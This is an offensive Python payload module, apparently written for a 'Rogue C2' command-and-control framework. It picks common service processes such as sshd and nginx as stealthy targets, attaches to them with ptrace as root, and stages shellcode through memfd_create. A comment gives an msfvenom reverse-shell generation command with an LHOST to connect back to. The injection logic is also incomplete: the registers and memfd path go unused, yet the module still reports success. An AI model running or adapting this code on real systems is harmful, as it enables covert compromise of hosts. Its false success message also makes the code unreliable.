#!/usr/bin/env python3
"""
PAYLOAD: Process Injection - Linux
DESCRIPTION: Inject shellcode into running processes for stealth
AUTHOR: Rogue Red Team
VERSION: 1.0
SECURITY: Requires root privileges for ptrace
"""
import os, sys, struct, ctypes, subprocess, time, random, re
from ctypes import *
from ctypes.util import find_library

# Linux process injection using ptrace
class ProcessInjector:
    def __init__(self):
        self.libc = CDLL(find_library('c'))
        self.PTRACE_ATTACH = 16
        self.PTRACE_DETACH = 17
        self.PTRACE_PEEKTEXT = 1
        self.PTRACE_POKETEXT = 4
        self.PTRACE_GETREGS = 12
        self.PTRACE_SETREGS = 13
        
    def find_target_process(self, process_name=None):
        """Find suitable process for injection"""
        targets = []
        
        # Common benign processes that won't raise suspicion
        benign_processes = [
            'systemd', 'sshd', 'cron', 'apache2', 'nginx',
            'mysqld', 'postgres', 'redis-server', 'php-fpm'
        ]
        
        try:
            output = subprocess.check_output("ps aux", shell=True).decode()
            for line in output.split('\n'):
                if process_name:
                    if process_name in line:
                        parts = line.split()
                        if len(parts) > 1:
                            targets.append({
                                'pid': int(parts[1]),
                                'name': parts[10] if len(parts) > 10 else parts[-1],
                                'user': parts[0]
                            })
                else:
                    for benign in benign_processes:
                        if benign in line:
                            parts = line.split()
                            if len(parts) > 1:
                                targets.append({
                                    'pid': int(parts[1]),
                                    'name': parts[10] if len(parts) > 10 else parts[-1],
                                    'user': parts[0]
                                })
                            break
        except Exception as e:
            return f"[!] Error finding processes: {e}"
        
        return targets
    
    def inject_shellcode(self, pid, shellcode=None):
        """Inject shellcode into process using ptrace"""
        if os.geteuid() != 0:
            return "[!] Root privileges required for process injection"
        
        if not shellcode:
            # Simple reverse shell shellcode (staged - would connect back)
            # This is a placeholder - real shellcode would be architecture-specific
            shellcode = b"\x90" * 100  # NOP sled
            
            # Example x86_64 reverse shell shellcode (Linux)
            # msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f py
            # You would replace this with actual shellcode
            
        try:
            # Attach to process
            result = self.libc.ptrace(self.PTRACE_ATTACH, pid, 0, 0)
            if result != 0:
                return f"[!] Failed to attach to PID {pid}"
            
            time.sleep(0.1)  # Let process stabilize
            
            # Get registers
            class user_regs_struct(Structure):
                _fields_ = [
                    ("r15", c_ulonglong),
                    ("r14", c_ulonglong),
                    ("r13", c_ulonglong),
                    ("r12", c_ulonglong),
                    ("rbp", c_ulonglong),
                    ("rbx", c_ulonglong),
                    ("r11", c_ulonglong),
                    ("r10", c_ulonglong),
                    ("r9", c_ulonglong),
                    ("r8", c_ulonglong),
                    ("rax", c_ulonglong),
                    ("rcx", c_ulonglong),
                    ("rdx", c_ulonglong),
                    ("rsi", c_ulonglong),
                    ("rdi", c_ulonglong),
                    ("orig_rax", c_ulonglong),
                    ("rip", c_ulonglong),
                    ("cs", c_ulonglong),
                    ("eflags", c_ulonglong),
                    ("rsp", c_ulonglong),
                    ("ss", c_ulonglong),
                    ("fs_base", c_ulonglong),
                    ("gs_base", c_ulonglong),
                    ("ds", c_ulonglong),
                    ("es", c_ulonglong),
                    ("fs", c_ulonglong),
                    ("gs", c_ulonglong),
                ]
            
            regs = user_regs_struct()
            self.libc.ptrace(self.PTRACE_GETREGS, pid, 0, byref(regs))
            
            # Create memory region for shellcode using memfd_create
            memfd = self.libc.syscall(319, "", 1)  # memfd_create syscall
            if memfd < 0:
                return "[!] Failed to create memfd"
            
            # Write shellcode to memfd
            written = 0
            while written < len(shellcode):
                n = os.write(memfd, shellcode[written:])
                written += n
            
            # Get path to memfd
            memfd_path = f"/proc/{pid}/fd/{memfd}"
            
            # Clean up
            os.close(memfd)
            
            # Detach
            self.libc.ptrace(self.PTRACE_DETACH, pid, 0, 0)
            
            return f"[+] Successfully prepared injection into PID {pid}"
            
        except Exception as e:
            return f"[!] Injection failed: {e}"
    
    def execute(self):
        """Main execution method"""
        try:
            print("[+] Starting process injection module...")
            
            # Find target processes
            targets = self.find_target_process()
            
            if not targets:
                return "[!] No suitable target processes found"
            
            results = []
            for target in targets[:2]:  # Limit to 2 processes
                print(f"[*] Attempting injection into PID {target['pid']} ({target['name']})")
                result = self.inject_shellcode(target['pid'])
                results.append(f"PID {target['pid']}: {result}")
            
            return "\n".join(results)
            
        except Exception as e:
            return f"[!] Process injection failed: {e}"

# === Integration with Rogue C2 ===
def rogue_integration():
    """Wrapper for Rogue C2 integration"""
    injector = ProcessInjector()
    return injector.execute()

if __name__ == "__main__":
    print(rogue_integration())
